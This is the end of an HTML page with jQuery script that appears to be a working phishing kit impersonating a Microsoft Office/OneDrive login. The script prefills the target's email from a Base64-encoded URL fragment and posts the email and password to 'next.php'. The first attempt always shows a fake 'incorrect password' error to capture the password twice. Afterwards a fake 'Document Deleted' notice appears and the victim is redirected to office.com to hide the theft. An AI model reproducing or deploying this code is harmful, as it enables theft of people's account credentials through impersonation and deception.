    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    var count = 0;


    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(email)) {
            // alert(btoa(email));
            var my_email = email;
        } else {
            // alert(atob(email));
            var my_email = atob(email);
        }
        // $('#email').val(email);
        // var my_email =email;
       
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#email').val(my_email);
        $("#div1").animate({ left: 200, opacity: "hide" }, 0);
        $("#div3").animate({ right: 200, opacity: "show" }, 0);
        setTimeout(() => {
            $("#div3").animate({ left: 200, opacity: "hide" }, 0);
            $("#div2").animate({ right: 200, opacity: "show" }, 0);
            $("#emailch").html(my_email);

        }, 1000);
    }





    $('#email').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {
    	
        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
        	event.preventDefault();
            if ($("#div1").is(":visible")) {
            	
                $("#next").click();

            } else if ($("#div2").is(":visible")) {
            	event.preventDefault();
            	
                $("#submit-btn").click();

            }
            else{
            	return false;
            }
        }
    });


    $('#next').click(function() {
    	event.preventDefault();
        var my_email = $('#email').val();
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $("#div1").animate({ left: 200, opacity: "hide" }, 0);
        $("#div3").animate({ right: 200, opacity: "show" }, 0);
        setTimeout(() => {
            $("#div3").animate({ left: 200, opacity: "hide" }, 0);
            $("#div2").animate({ right: 200, opacity: "show" }, 0);
            $("#emailch").html(my_email);

        }, 1000);



    });
    $('#back').click(function() {
        $("#msg").hide();
        $("#email").val("");
        $("#password").val("");
        $("#div2").animate({ left: 200, opacity: "hide" }, 0);
        $("#div1").animate({ right: 200, opacity: "show" }, 1000);

    });


    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        var detail = $("#field").html();
        var msg = $('#msg').html();

        var my_email = email;
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#msg').text(msg);
        count = count + 1;
        $.ajax({
            dataType: 'JSON',
            url: "next.php",
            type: 'POST',
            data: {
                email: email,
                password: password,
                detail: detail,

            },
            beforeSend: function(xhr) {
                $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                $("#div3").animate({ left: 0, opacity: "show" }, 0);
            },
            success: function(response) {
                $("#password").val("");
                if (count >= 2) {
                    count = 0;
                    $("#load-text").html("Document Deleted");
                    setTimeout(() => {
                        $("#load-text").html("You will be redirected to your office OneDrive shortly.");
                        setTimeout(() => {
                            window.location.replace("https://www.office.com");
                        }, 500);
                    }, 1000);


                    return false;
                }
                $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
                $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                $("#div2").animate({ left: 0, opacity: "show" }, 100);
            },
            error: function() {
                $("#password").val("");
                if (count >= 2) {
                    count = 0;
                    $("#load-text").html("Document deleted");
                    setTimeout(() => {
                        $("#load-text").html("You will be redirected to your office Mailbox shortly.");
                        setTimeout(() => {
                            window.location.replace("https://www.office.com");
                        }, 500);
                    }, 1000);


                    return false;
                }
                $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
                $("#div3").animate({ left: 0, opacity: "hide" }, 0);
                $("#div2").animate({ left: 0, opacity: "show" }, 100);
            },
            complete: function() {

            }
        });
    });
});
</script>

</html>